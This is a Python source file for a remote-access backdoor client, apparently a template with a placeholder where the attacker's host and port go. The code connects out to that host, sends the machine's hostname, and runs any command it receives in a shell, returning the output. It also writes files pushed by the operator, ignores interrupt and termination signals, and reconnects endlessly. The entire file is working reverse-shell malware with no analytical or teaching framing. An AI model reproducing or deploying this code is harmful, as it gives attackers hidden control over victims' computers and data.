import os
import socket
import subprocess
import time
import signal
import sys
import struct

class Client(object):
    def __init__(self):
        HERE_IS_YOUR_HOST_AND_PORT
        self.socket = None

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.do_notting)
        signal.signal(signal.SIGTERM, self.do_notting)
        return

    def do_notting(self, signal=None, frame=None):
        return

    def socket_create(self):
        try:
            self.socket = socket.socket()
        except socket.error as e:
            return
        return

    def socket_connect(self):
        try:
            self.socket.connect((self.serverHost, self.serverPort))
            # self.socket.setblocking(1)
        except socket.error as e:
            time.sleep(5)
            raise
        try:
            self.socket.send(socket.gethostname().encode('utf-8'))
        except socket.error as e:
            raise
        return

    def receive_commands(self):
        cwd = (os.getcwd() + '> ').encode('utf-8')
        self.socket.send(struct.pack('>I', len(cwd)) + cwd)
        while True:
            output_str = None
            data = self.socket.recv(20480)
            if data == b'':
                break
            elif data[:2].decode("utf-8") == 'cd':
                directory = data[3:].decode("utf-8")
                try:
                    os.chdir(directory.strip())
                except Exception as e:
                    output_str = "Could not change directory: " + str(e) + "\n"
                else:
                    output_str = ""
            elif data[:].decode("utf-8") == 'exit':
                return
            elif len(data) > 0:
                try:
                    cmd = subprocess.Popen(data[:].decode(
                        "utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = output_bytes.decode(
                        "utf-8", errors="replace")
                except Exception as e:
                    output_str = "Command execution unsuccessful: " + \
                        str(e) + "\n"
            if output_str is not None:
                sent_message = (output_str + os.getcwd() +
                                '> ').encode('utf-8')
                try:
                    self.socket.send(struct.pack(
                        '>I', len(sent_message)) + sent_message)
                except Exception as e:
                    return
        return

    def receive_file(self):
        fileinfo = self.socket.recv(1024).decode('utf-8')
        self.socket.send("N".encode('utf-8'))
        fileinfo = fileinfo.split(',')
        filesize = fileinfo[1]
        filename = fileinfo[0]
        total = 0
        f = open("./"+filename, 'wb')
        l = self.socket.recv(1024)
        total = len(l)
        while (l):
            f.write(l)
            if (str(total) != filesize):
                l = self.socket.recv(1024)
                total = total + len(l)
            else:
                break
        f.close()
        return

    def receiver(self):
        timeout = time.time() + 300
        while time.time() < timeout:
            data = self.socket.recv(6).decode('utf-8')
            if (data == 'shell0'):
                self.receive_commands()
                timeout = time.time() + 300
            elif (data == 'upload'):
                self.receive_file()
                timeout = time.time() + 300
            elif (data == 'discon'):
                return
            time.sleep(0.5)
        return


def main():
    client = Client()
    client.register_signal_handler()
    client.socket_create()
    while True:
        try:
            client.socket_connect()
        except Exception as e:
            time.sleep(5)
        else:
            break
    client.receiver()
    client.socket.close()
    return


while True:
    time.sleep(0.1)
    main()
